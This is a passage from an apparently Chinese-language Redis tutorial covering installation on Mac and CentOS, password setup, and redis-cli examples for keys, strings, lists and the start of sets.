<th style="text-align:center">&#x6570;&#x636E;&#x5E93;</th>
<th style="text-align:center">&#x529F;&#x80FD;</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">Memcache</td>
<td style="text-align:center">NoSql &#x6570;&#x636E;&#x5E93;&#xFF1B;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF1B; &#x53EA;&#x652F;&#x6301;&#x5355;&#x4E00;&#x7C7B;&#x578B;&#xFF0C;&#x4E0D;&#x652F;&#x6301;&#x6301;&#x4E45;&#x5316;&#xFF0C;&#x4E14;&#x662F;&#x591A;&#x7EBF;&#x7A0B;&#x4E0E;&#x9501;&#x7684;&#x65B9;&#x5F0F;</td>
</tr>
<tr>
<td style="text-align:center">Redis</td>
<td style="text-align:center">NoSql &#x6570;&#x636E;&#x5E93;&#xFF1B;&#x5185;&#x5B58;&#x6570;&#x636E;&#x5B58;&#x50A8;&#x7CFB;&#x7EDF;&#xFF1B; &#x51E0;&#x4E4E;&#x8986;&#x76D6;&#x4E86; Memcached &#x7684;&#x7EDD;&#x5927;&#x90E8;&#x5206;&#x529F;&#x80FD;&#xFF1B; &#x652F;&#x6301; key-value&#x3001;&#x6301;&#x4E45;&#x5316;&#xFF1B;&#x652F;&#x6301;&#x591A;&#x79CD;&#x6570;&#x636E;&#x7ED3;&#x6784;&#xFF1B; &#x4E00;&#x822C;&#x4F5C;&#x4E3A;&#x7F13;&#x5B58;&#x6570;&#x636E;&#x5E93;&#x8F85;&#x52A9;&#x6301;&#x4E45;&#x5316;&#x7684;&#x6570;&#x636E;&#x5E93;</td>
</tr>
<tr>
<td style="text-align:center">MongoDB</td>
<td style="text-align:center">&#x6587;&#x6863;&#x578B;&#x6570;&#x636E;&#x5E93;&#xFF1B; &#x6570;&#x636E;&#x5B58;&#x5728;&#x5185;&#x5B58;&#xFF0C;&#x82E5;&#x5185;&#x5B58;&#x4E0D;&#x8DB3;&#xFF0C;&#x5C06;&#x975E;&#x70ED;&#x70B9;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x4E8E;&#x786C;&#x76D8;&#xFF1B; key-value&#x6A21;&#x5F0F;&#xFF1B;&#x67E5;&#x8BE2;&#x529F;&#x80FD;&#x4E30;&#x5BCC;&#xFF1B;&#x652F;&#x6301;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x53CA;&#x5927;&#x578B;&#x5BF9;&#x8C61;&#xFF1B; &#x53EF;&#x66FF;&#x4EE3; RDBMS &#x6210;&#x4E3A;&#x72EC;&#x7ACB;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6216;&#x914D;&#x5408; RDBMS &#x5B58;&#x50A8;&#x7279;&#x5B9A;&#x7684;&#x6570;&#x636E;</td>
</tr>
</tbody>
</table>
<p>Redis &#x4F7F;&#x7528;&#x5355;&#x7EBF;&#x7A0B;&#x4E0E;&#x591A;&#x8DEF; IO &#x590D;&#x7528;&#x6280;&#x672F;&#x3002;&#x591A;&#x8DEF; IO &#x590D;&#x7528;&#x662F;&#x6307;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x6765;&#x68C0;&#x67E5;&#x591A;&#x4E2A;&#x6587;&#x4EF6;&#x63CF;&#x8FF0;&#x7B26;&#x7684;&#x5C31;&#x7EEA;&#x72B6;&#x6001;&#x3002;&#x5C31;&#x7EEA;&#x5219;&#x8FD4;&#x56DE;&#xFF0C;&#x5426;&#x5219;&#x963B;&#x585E;&#x76F4;&#x5230;&#x8D85;&#x65F6;&#x3002;&#x5F97;&#x5230;&#x5C31;&#x7EEA;&#x72B6;&#x6001;&#x540E;&#x8FDB;&#x884C;&#x7684;&#x64CD;&#x4F5C;&#x53EF;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x91CC;&#x6267;&#x884C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x7EBF;&#x7A0B;&#x6267;&#x884C;&#x3002;</p>
<h3 id="%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE">&#x5B89;&#x88C5;&#x914D;&#x7F6E;</h3>
<ul>
<li>Mac &#x73AF;&#x5883;</li>
</ul>
<pre><code class="language-shell"># brew&#x5B89;&#x88C5;
$ brew install redis
# &#x542F;&#x52A8;|&#x5173;&#x95ED;|&#x91CD;&#x542F; redis &#x670D;&#x52A1;
$ brew services start|stop|restart redis
# &#x6253;&#x5F00;&#x56FE;&#x5F62;&#x5316;&#x754C;&#x9762;
$ redis-cli
# &#x67E5;&#x770B;&#x7248;&#x672C;&#x4FE1;&#x606F;
127.0.0.1:6379&gt; info
# &#x5F00;&#x673A;&#x542F;&#x52A8; redis
$ ln -sfv /usr/local/opt/redis/*.plist ~/Library/LaunchAgents
# &#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x542F;&#x52A8; redis-server
redis-server /usr/local/etc/redis.conf
# &#x505C;&#x6B62;redis&#x670D;&#x52A1;
redis-cli shutdown
# redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4F4D;&#x7F6E;
/usr/local/etc/redis.conf
# &#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;
# &#x6CE8;&#x91CA; bind. &#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B; redis &#x4E0D;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x8BBF;&#x95EE;&#x53EA;&#x5141;&#x8BB8;&#x672C;&#x673A;
$ vim /usr/local/etc/redis.conf
# redis3.2 &#x540E;&#x589E;&#x52A0; protected-mode, &#x9700;&#x628A; protected-mode yes &#x6539;&#x4E3A; protected-mode no
</code></pre>
<ul>
<li>CentOS &#x73AF;&#x5883;</li>
</ul>
<pre><code class="language-shell"># &#x8981;&#x6C42; C &#x8BED;&#x8A00;&#x7F16;&#x8BD1;&#x73AF;&#x5883;
$ gcc --version
gcc (GCC) 4.8.5 20150623 (Red Hat 4.8.5-44)
# &#x5728; /opt &#x4E0B;&#x8F7D;&#x5E76;&#x89E3;&#x538B;&#x5B89;&#x88C5;&#x5305;
$ wget http://download.redis.io/releases/redis-7.0.2.tar.gz
$ tar -xzf redis-7.0.2.tar.gz
# Redis &#x76EE;&#x5F55;&#x4E0B;&#x6267;&#x884C;&#x7F16;&#x8BD1;&#x4E0E;&#x5B89;&#x88C5;
$ make
$ make install
# &#x9ED8;&#x8BA4;&#x5B89;&#x88C5;&#x76EE;&#x5F55; /usr/local/bin
$ cd /usr/local/bin &amp;&amp; ls
redis-check-aof =&gt; &#x4FEE;&#x590D;&#x6709;&#x95EE;&#x9898;&#x7684; AOF &#x6587;&#x4EF6;
redis-cli =&gt; &#x5BA2;&#x6237;&#x7AEF;
redis-server =&gt; redis &#x670D;&#x52A1;&#x5668;&#x542F;&#x52A8;&#x547D;&#x4EE4;
redis-benchmark =&gt; &#x6027;&#x80FD;&#x6D4B;&#x8BD5;&#x5DE5;&#x5177;
redis-check-rdb =&gt; &#x68C0;&#x67E5;&#x8F6C;&#x50A8;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x5B8C;&#x6574;&#x6027;
redis-sentinel =&gt; &#x96C6;&#x7FA4;&#x4F7F;&#x7528;&#x63D0;&#x4F9B;&#x5BF9;&#x6240;&#x6709; Redis &#x8282;&#x70B9;&#x7684;&#x76D1;&#x63A7;&#x5E76;&#x5728;&#x4E3B;&#x8282;&#x70B9;&#x4E0D;&#x53EF;&#x7528;&#x65F6;&#x81EA;&#x52A8;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x8F6C;&#x79FB;
# redis &#x542F;&#x52A8; =&gt; &#x4E0D;&#x63A8;&#x8350;&#x524D;&#x53F0;&#x542F;&#x52A8;
$ cd /opt/redis-7.0.2/
# &#x590D;&#x5236;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x66F4;&#x6539;&#x914D;&#x7F6E;
$ cp redis.conf /etc/redis.conf
$ cd /etc
# &#x8BBE;&#x7F6E; daemonize no &#x6539;&#x4E3A; yes =&gt; &#x641C;&#x7D22;&#x6A21;&#x5F0F; / =&gt; 309
$ vim redis.conf
# &#x540E;&#x7EED;&#x64CD;&#x4F5C;&#x53EA;&#x9700;&#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x5373;&#x53EF;
$ cd /usr/local/bin
$ redis-server /etc/redis.conf
$ ps -ef | grep redis
root     10261     1  0 13:55 ?        00:00:00 redis-server 127.0.0.1:6379
root     10311  5616  0 13:55 pts/0    00:00:00 grep --color=auto redis
$ redis-cli
127.0.0.1:6379&gt; ping
PONG
# &#x5173;&#x95ED; redis
127.0.0.1:6379&gt; exit
kill -9 10261
</code></pre>
<ul>
<li>Mac &#x8BBE;&#x7F6E; Redis &#x7684;&#x5BC6;&#x7801;</li>
</ul>
<pre><code class="language-shell"># &#x65B9;&#x5F0F;&#x4E00;
$ redis-cli
127.0.0.1:6379&gt; config get requirepass
1) &quot;requirepass&quot;
2) &quot;&quot;
127.0.0.1:6379&gt; config set requirepass &quot;&lt;password&gt;&quot;
OK
127.0.0.1:6379&gt; config get requirepass
(error) NOAUTH Authentication required.
127.0.0.1:6379&gt; auth &lt;password&gt;
OK
127.0.0.1:6379&gt; config get requirepass
1) &quot;requirepass&quot;
2) &quot;&lt;password&gt;&quot;
# &#x65B9;&#x5F0F;&#x4E8C;
$ vim /usr/local/etc/redis.conf
# 898 # The requirepass is not compatable with aclfile option and the ACL LOAD
# 899 # command, these will cause requirepass to be ignored.
# 900 #
# 901 # requirepass foobared =&gt; &#x4FEE;&#x6539;&#x6389; foobared &#x5E76;&#x89E3;&#x9664;&#x6CE8;&#x91CA;
$ brew services restart redis
# &#x91CD;&#x542F;&#x540E;&#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x53EF;&#x8FDB;&#x884C; redis-cli &#x4F46;&#x4E0D;&#x80FD;&#x8FDB;&#x884C;&#x64CD;&#x4F5C;
$ redis-cli -h 127.0.0.1 -p 6379 -a &lt;password&gt;
# &#x8F93;&#x5165;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x72B6;&#x6001;
127.0.0.1:6379&gt; CONFIG get REQUIREPASS
1) &quot;REQUIREPASS&quot;
2) &quot;&lt;password&gt;&quot;
# &#x4E0D;&#x8F93;&#x5165;&#x5BC6;&#x7801;&#x767B;&#x5F55;&#x72B6;&#x6001;
127.0.0.1:6379&gt; CONFIG GET REQUIREPASS
(error) NOAUTH Authentication required.
</code></pre>
<h3 id="%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">&#x6570;&#x636E;&#x7C7B;&#x578B;</h3>
<p>redis &#x5E38;&#x7528;&#x7684;&#x4E94;&#x5927;&#x6570;&#x636E;&#x7C7B;&#x578B;&#x4E3A; String&#x3001;List&#x3001;Set&#x3001;Hash&#x3001;Zset&#x3002;</p>
<ul>
<li>Key &#x952E;</li>
</ul>
<pre><code class="language-shell">$ /usr/local/bin/redis-cli
# &#x8BBE;&#x7F6E; key &#x503C;&#x4E0E; value
127.0.0.1:6379&gt; set k1 zs # set k2 gz set k3 jr
# &#x67E5;&#x770B;&#x5F53;&#x524D;&#x5E93;&#x6240;&#x6709; key
127.0.0.1:6379&gt; keys *
1) &quot;k3&quot;
2) &quot;k2&quot;
3) &quot;k1&quot;
# exists key =&gt; &#x5224;&#x65AD; key &#x662F;&#x5426;&#x5B58;&#x5728; -&gt; 1 &#x5B58;&#x5728;; 0&#x4E0D;&#x5B58;&#x5728;
127.0.0.1:6379&gt; exists k1
(integer) 1
# type key =&gt; &#x67E5;&#x770B; key &#x662F;&#x4EC0;&#x4E48;&#x7C7B;&#x578B;
127.0.0.1:6379&gt; type k1
string
# del key =&gt; &#x5220;&#x9664;&#x6307;&#x5B9A;&#x7684; key &#x6570;&#x636E;
127.0.0.1:6379&gt; del k3
(integer) 1
# expire key 10 =&gt; &#x4E3A;&#x7ED9;&#x5B9A;&#x7684; key &#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4; -- &#x79D2;
127.0.0.1:6379&gt; expire k2 10
(integer) 1
# ttl key =&gt; &#x67E5;&#x770B;&#x8FD8;&#x6709;&#x591A;&#x5C11;&#x79D2;&#x8FC7;&#x671F; -&gt; -1 &#x6C38;&#x4E0D;&#x8FC7;&#x671F;; -2 &#x5DF2;&#x8FC7;&#x671F;
127.0.0.1:6379&gt; ttl k2
(integer) -2
# unlink key =&gt; &#x6839;&#x636E; value &#x9009;&#x62E9;&#x975E;&#x963B;&#x585E;&#x5220;&#x9664;, &#x5373;&#x5F02;&#x6B65;&#x5220;&#x9664;
127.0.0.1:6379&gt; unlink k2
(integer) 0
# select =&gt; &#x5207;&#x6362;&#x6570;&#x636E;&#x5E93;
select 0
# dbsize =&gt; &#x67E5;&#x770B;&#x5F53;&#x524D;&#x6570;&#x636E;&#x5E93;&#x7684; key &#x6570;&#x91CF;
127.0.0.1:6379&gt; dbsize
(integer) 1
# flushdb =&gt; &#x6E05;&#x7A7A;&#x5F53;&#x524D;&#x5E93;
127.0.0.1:6379&gt; flushdb
OK
# flushall =&gt; &#x901A;&#x6740;&#x5168;&#x90E8;&#x5E93; =&gt; &#x614E;&#x7528;
</code></pre>
<ul>
<li>String &#x5B57;&#x7B26;&#x4E32;</li>
</ul>
<p>String &#x662F; Redis &#x6700;&#x57FA;&#x672C;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x53EF;&#x4EE5;&#x7406;&#x89E3;&#x4E0E; Memcached &#x4E00;&#x6837;&#x7684;&#x7C7B;&#x578B;&#xFF0C;&#x4E00;&#x4E2A; Key &#x5BF9;&#x5E94;&#x4E00;&#x4E2A; Value&#x3002;String &#x662F;&#x4E8C;&#x8FDB;&#x5236;&#x5B89;&#x5168;&#x7684;&#xFF0C;&#x5373; Redis &#x7684; String &#x53EF;&#x4EE5;&#x5305;&#x542B;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#xFF0C;&#x5982;&#x56FE;&#x7247;&#x6216;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x3002;Redis &#x4E2D;&#x5B57;&#x7B26;&#x4E32; Value &#x6700;&#x591A;&#x53EF;&#x4EE5;&#x662F; 512M&#x3002;</p>
<p>&#x7F51;&#x7AD9;&#x9875;&#x9762;&#x8BBF;&#x95EE;&#x91CF; PageView PV &#x53EF;&#x4F7F;&#x7528; Redis &#x7684; incr&#x3001;incrby &#x5B9E;&#x73B0;&#x3002;</p>
<pre><code class="language-shell"># set &lt;Key&gt; &lt;Value&gt; =&gt; &#x8BBE;&#x7F6E; Key-Value
127.0.0.1:6379&gt; set k1 v100
OK
127.0.0.1:6379&gt; set k2 v200
OK
# get &lt;Key&gt; =&gt; &#x67E5;&#x8BE2; Key &#x503C;
127.0.0.1:6379&gt; get k1
&quot;v100&quot;
127.0.0.1:6379&gt; get k2
&quot;v200&quot;
# append &lt;Key&gt; &lt;Value&gt; =&gt; &#x5C06;&#x7ED9;&#x5B9A;&#x7684; Value &#x8FFD;&#x52A0;&#x5230;&#x539F;&#x503C;&#x672B;&#x5C3E;
127.0.0.1:6379&gt; append k1 123
(integer) 7
127.0.0.1:6379&gt; get k1
&quot;v100123&quot;
# strlen &lt;Key&gt; =&gt; &#x83B7;&#x53D6;&#x503C;&#x7684;&#x957F;&#x5EA6;
127.0.0.1:6379&gt; strlen k1
(integer) 7
# setnx &lt;Key&gt; &lt;Value&gt; =&gt; &#x53EA;&#x6709;&#x5728; Key &#x4E0D;&#x5B58;&#x5728;&#x7684;&#x65F6;&#x5019;&#x8BBE;&#x7F6E; Key &#x503C;
127.0.0.1:6379&gt; setnx k1 123
(integer) 0
127.0.0.1:6379&gt; setnx k3 v333
(integer) 1
# incr &lt;Key&gt; =&gt; &#x5C06; Key &#x503C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x5B57;&#x589E;1 -&gt; &#x5982;&#x679C;&#x4E3A;&#x7A7A;&#x5219;&#x65B0;&#x589E;&#x503C;&#x4E3A;1
127.0.0.1:6379&gt; set k4 444
OK
127.0.0.1:6379&gt; incr k4
(integer) 445
# decr &lt;Key&gt; =&gt; &#x5C06; Key &#x503C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x5B57;&#x51CF;1 -&gt; &#x5982;&#x679C;&#x4E3A;&#x7A7A;&#x5219;&#x65B0;&#x589E;&#x503C;&#x4E3A;1
127.0.0.1:6379&gt; decr k4
(integer) 444
# incrby/decrby &lt;Key&gt; &lt;&#x6B65;&#x957F;&gt; =&gt; &#x5C06; Key &#x503C;&#x5B58;&#x50A8;&#x7684;&#x6570;&#x5B57;&#x589E;&#x51CF;&#x6B65;&#x957F;
127.0.0.1:6379&gt; incrby k4 10
(integer) 454
</code></pre>
<blockquote>
<p>&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#x6307;&#x7684;&#x662F;&#x5E76;&#x4E0D;&#x4F1A;&#x88AB;&#x7EBF;&#x7A0B;&#x8C03;&#x5EA6;&#x673A;&#x5236;&#x6253;&#x65AD;&#x7684;&#x64CD;&#x4F5C;&#x3002;&#x6B64;&#x64CD;&#x4F5C;&#x4E00;&#x65E6;&#x5F00;&#x59CB;&#xFF0C;&#x5C31;&#x4E00;&#x76F4;&#x8FD0;&#x884C;&#x5230;&#x7ED3;&#x675F;&#xFF0C;&#x4E2D;&#x95F4;&#x4E0D;&#x4F1A;&#x6709;&#x4EFB;&#x4F55; context switch &#x5207;&#x6362;&#x5230;&#x53E6;&#x4E00;&#x4E2A;&#x7EBF;&#x7A0B;&#x3002;&#x5728;&#x5355;&#x7EBF;&#x7A0B;&#x4E2D;&#xFF0C;&#x80FD;&#x5728;&#x5355;&#x6761;&#x6307;&#x4EE4;&#x4E2D;&#x5B8C;&#x6210;&#x7684;&#x64CD;&#x4F5C;&#x90FD;&#x53EF;&#x770B;&#x4F5C;&#x4E3A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x7EC8;&#x7AEF;&#x53EA;&#x80FD;&#x53D1;&#x751F;&#x4E8E;&#x6307;&#x4EE4;&#x4E4B;&#x95F4;&#x3002;&#x591A;&#x7EBF;&#x7A0B;&#x4E2D;&#x53EF;&#x80FD;&#x4F1A;&#x5B58;&#x5728;&#x6709;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x5373;&#x4E0D;&#x88AB;&#x5176;&#x4ED6;&#x8FDB;&#x7A0B;&#x6253;&#x65AD;&#x7684;&#x64CD;&#x4F5C;&#x3002;</p>
</blockquote>
<blockquote>
<p>&#x9762;&#x8BD5;&#x9898;&#xFF1A;Java &#x4E2D;&#x7684; i++ &#x662F;&#x5426;&#x4E3A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF1F;&#x82E5; i=0&#xFF0C;&#x4E24;&#x4E2A;&#x7EBF;&#x7A0B;&#x5206;&#x522B;&#x5BF9; i &#x8FDB;&#x884C; ++100 &#x64CD;&#x4F5C;&#xFF0C;&#x7ED3;&#x679C;&#x662F;&#xFF1F;&#x5426;&#xFF1B;Java &#x662F;&#x591A;&#x7EBF;&#x7A0B;&#xFF0C;&#x6545; i++ &#x5E76;&#x975E;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF1B;&#x6700;&#x7EC8;&#x8303;&#x56F4;&#x662F; 2-200&#x3002;</p>
</blockquote>
<pre><code class="language-shell">127.0.0.1:6379&gt; flushdb
OK
127.0.0.1:6379&gt; keys *
(empty array)
# mset &lt;Key&gt; &lt;Value&gt; &lt;Key&gt; &lt;Value&gt;... =&gt; &#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A; Key-Value
127.0.0.1:6379&gt; mset k1 v1 k2 v2 k3 v3
OK
127.0.0.1:6379&gt; keys *
1) &quot;k3&quot;
2) &quot;k2&quot;
3) &quot;k1&quot;
# mget &lt;Key&gt; &lt;Key&gt;... =&gt; &#x540C;&#x65F6;&#x83B7;&#x53D6;&#x4E00;&#x4E2A;&#x6216;&#x591A;&#x4E2A; Value
127.0.0.1:6379&gt; mget k1 k2 k3
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;v3&quot;
# msetnx &lt;Key&gt; &lt;Value&gt; &lt;Key&gt; &lt;Value&gt;.. =&gt; &#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A; Key-Value -&gt; &#x5F53;&#x4E14;&#x4EC5;&#x5F53;&#x6240;&#x6709;&#x7ED9;&#x5B9A; Key &#x90FD;&#x4E0D;&#x5B58;&#x5728;
127.0.0.1:6379&gt; msetnx k4 v4 k5 v5
(integer) 1
# getrange &lt;Key&gt; &lt;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&gt; &lt;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&gt; =&gt; &#x83B7;&#x53D6; Key &#x7684;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x548C;&#x7ED3;&#x675F;&#x4F4D;&#x7F6E;&#x7684;&#x503C;
127.0.0.1:6379&gt; set user zairesinatra
OK
127.0.0.1:6379&gt; getrange user 0 4
&quot;zaire&quot;
# setrange &lt;Key&gt; &lt;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&gt; &lt;Value&gt; =&gt; &#x5C06; Value &#x7684;&#x503C;&#x8986;&#x76D6;&#x8D77;&#x59CB;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;
127.0.0.1:6379&gt; setrange user 12 -zszy
(integer) 17
127.0.0.1:6379&gt; get user
&quot;zairesinatra-zszy&quot;
# setex &lt;Key&gt; &lt;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&gt; &lt;Value&gt; =&gt; &#x8BBE;&#x7F6E;&#x952E;&#x503C;&#x7684;&#x540C;&#x65F6;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;
127.0.0.1:6379&gt; setex age 10 22
OK
127.0.0.1:6379&gt; ttl age
(integer) 6
# getset &lt;Key&gt; &lt;Value&gt; =&gt; &#x8BBE;&#x7F6E;&#x65B0;&#x503C;&#x540C;&#x65F6;&#x83B7;&#x5F97;&#x65E7;&#x503C;
127.0.0.1:6379&gt; getset user zszy
&quot;zairesinatra-zszy&quot;
127.0.0.1:6379&gt; get user
&quot;zszy&quot;
</code></pre>
<ul>
<li>List &#x5217;&#x8868;</li>
</ul>
<p>&#x5728;&#x7248;&#x672C; 3.2 &#x4E4B;&#x524D;&#xFF0C;Redis &#x5217;&#x8868; List &#x4F7F;&#x7528;&#x538B;&#x7F29;&#x5217;&#x8868; Ziplist &#x548C;&#x53CC;&#x5411;&#x94FE;&#x8868; Linkedlist &#x4F5C;&#x4E3A;&#x5E95;&#x5C42;&#x5B9E;&#x73B0;&#x3002;&#x5728;&#x7248;&#x672C; 3.2 &#x4E4B;&#x540E;&#xFF0C;Redis &#x91C7;&#x7528;&#x5FEB;&#x901F;&#x5217;&#x8868; Quicklist&#xFF0C;&#x5373;&#x4EE5;&#x538B;&#x7F29;&#x5217;&#x8868; Ziplist &#x4E3A;&#x8282;&#x70B9;&#x7684;&#x94FE;&#x8868; Linkedlist&#x3002;</p>
<p>&#x5728;&#x5217;&#x8868;&#x5143;&#x7D20;&#x8F83;&#x5C11;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F7F;&#x7528;&#x4E00;&#x5757;&#x8FDE;&#x7EED;&#x7684;&#x5185;&#x5B58;&#x5B58;&#x50A8;&#xFF0C;&#x8FD9;&#x4E2A;&#x7ED3;&#x6784;&#x662F; ziplist&#xFF0C;&#x5373;&#x538B;&#x7F29;&#x5217;&#x8868;&#x3002;&#x5F53;&#x6570;&#x636E;&#x91CF;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x6539;&#x6210; quicklist&#x3002;&#x56E0;&#x666E;&#x901A;&#x94FE;&#x8868;&#x7684;&#x9644;&#x52A0;&#x6307;&#x9488; prev &#x548C; next &#x7A7A;&#x95F4;&#x592A;&#x5927;&#xFF0C;&#x8F83;&#x4E3A;&#x6D6A;&#x8D39;&#x3002;</p>
<pre><code class="language-shell">127.0.0.1:6379&gt; flushdb
OK
# lpush/rpush &lt;Key&gt; &lt;Value&gt; &lt;Value&gt;... =&gt; &#x4ECE;&#x5DE6;&#x6216;&#x53F3;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x503C;
127.0.0.1:6379&gt; lpush k1 v1 v11 v111
(integer) 3
# lrange key 0 -1 =&gt; &#x83B7;&#x53D6;&#x6240;&#x6709;&#x503C;
127.0.0.1:6379&gt; lrange k1 0 -1
1) &quot;v111&quot;
2) &quot;v11&quot;
3) &quot;v1&quot;
# lpop/rpop key =&gt; &#x4ECE;&#x5DE6;&#x6216;&#x8005;&#x53F3;&#x5410;&#x51FA;&#x4E00;&#x4E2A;&#x6216;&#x8005;&#x591A;&#x4E2A;&#x503C; -&gt; &#x503C;&#x5728;&#x952E;&#x5728;
127.0.0.1:6379&gt; lpop k1
&quot;v111&quot;
# rpoplpush &lt;Key1&gt; &lt;Key2&gt; =&gt; &#x4ECE; Key1 &#x5217;&#x8868;&#x53F3;&#x8FB9;&#x5410;&#x51FA;&#x4E00;&#x4E2A;&#x503C;&#x63D2;&#x5165;&#x5230; Key2 &#x7684;&#x5DE6;&#x8FB9;
127.0.0.1:6379&gt; rpush k2 v2 v22
(integer) 2
127.0.0.1:6379&gt; rpoplpush k1 k2
&quot;v1&quot;
lrange key start stop =&gt; &#x6309;&#x7167;&#x7D22;&#x5F15;&#x4E0B;&#x6807;&#x83B7;&#x53D6;&#x5143;&#x7D20; -&gt; &#x4ECE;&#x5DE6;&#x5230;&#x53F3;
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;v22&quot;
# lindex &lt;Key&gt; &lt;Index&gt; =&gt; &#x6309;&#x7167;&#x7D22;&#x5F15;&#x4E0B;&#x6807;&#x83B7;&#x5F97;&#x5143;&#x7D20;
127.0.0.1:6379&gt; lindex k2 0
&quot;v1&quot;
# llen &lt;Key&gt; =&gt; &#x83B7;&#x53D6;&#x5217;&#x8868;&#x957F;&#x5EA6;
127.0.0.1:6379&gt; llen k2
(integer) 3
# linsert key before/after value newvalue =&gt; &#x5728;value&#x7684;&#x524D;&#x9762;&#x63D2;&#x5165;&#x4E00;&#x4E2A;&#x65B0;&#x503C;
127.0.0.1:6379&gt; linsert k2 before &quot;v22&quot; &quot;newv22&quot;
(integer) 4
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;newv22&quot;
4) &quot;v22&quot;
# lrem key &lt;n&gt; &lt;Value&gt; =&gt; &#x4ECE;&#x5DE6;&#x8FB9;&#x5220;&#x9664; n &#x4E2A; Value &#x503C;
127.0.0.1:6379&gt; lrem k2 1 newv22
(integer) 1
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;v2&quot;
3) &quot;v22&quot;
# lset key index value =&gt; &#x5728;&#x5217;&#x8868; Key &#x4E2D;&#x7684;&#x4E0B;&#x6807; Index &#x4E2D;&#x4FEE;&#x6539;&#x503C; Value
127.0.0.1:6379&gt; lset k2 1 zsv11
OK
127.0.0.1:6379&gt; lrange k2 0 -1
1) &quot;v1&quot;
2) &quot;zsv11&quot;
3) &quot;v22&quot;
</code></pre>
<ul>
<li>Set &#x96C6;&#x5408;</li>
</ul>
<p>Redis &#x7684; Set &#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x7684;&#x529F;&#x80FD;&#x4E0E;&#x5217;&#x8868; List &#x7C7B;&#x4F3C;&#xFF0C;&#x4F46;&#x524D;&#x8005;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x6392;&#x91CD;&#x3002;&#x4E14; Set &#x63D0;&#x4F9B;&#x5224;&#x65AD;&#x67D0;&#x4E2A;&#x6210;&#x5458;&#x662F;&#x5426;&#x5728;&#x4E00;&#x4E2A; Set &#x96C6;&#x5408;&#x5185;&#x7684;&#x91CD;&#x8981;&#x63A5;&#x53E3;&#xFF0C;&#x8FD9;&#x4E2A;&#x4E5F;&#x662F; List &#x6240;&#x6CA1;&#x6709;&#x7684;&#x3002;</p>
<p>Redis &#x7684; Set &#x662F; String &#x7C7B;&#x578B;&#x7684;&#x65E0;&#x5E8F;&#x96C6;&#x5408;&#xFF0C;&#x5176;&#x5E95;&#x5C42;&#x662F; value &#x4E3A; null &#x7684; Hash &#x7ED3;&#x6784;&#xFF0C;&#x6240;&#x6709;&#x7684; value &#x90FD;&#x6307;&#x5411;&#x540C;&#x4E00;&#x4E2A;&#x5185;&#x90E8;&#x503C;&#x3002;&#x6545;&#x6DFB;&#x52A0;&#xFF0C;&#x5220;&#x9664;&#xFF0C;&#x67E5;&#x627E;&#x7684;&#x590D;&#x6742;&#x5EA6;&#x90FD;&#x662F; O (1)&#x3002;</p>
<pre><code class="language-shell"># sadd &lt;Key&gt; &lt;Value1&gt; &lt;Value2&gt;... =&gt; &#x5C06;&#x4E00;&#x6216;&#x591A;&#x4E2A; member &#x5143;&#x7D20;&#x6DFB;&#x52A0;&#x5230;&#x96C6;&#x5408; Key &#x4E2D;&#x5E76;&#x5FFD;&#x7565;&#x5DF2;&#x5B58;&#x5728;&#x7684; member
127.0.0.1:6379&gt; sadd k1 v1 v2 v3
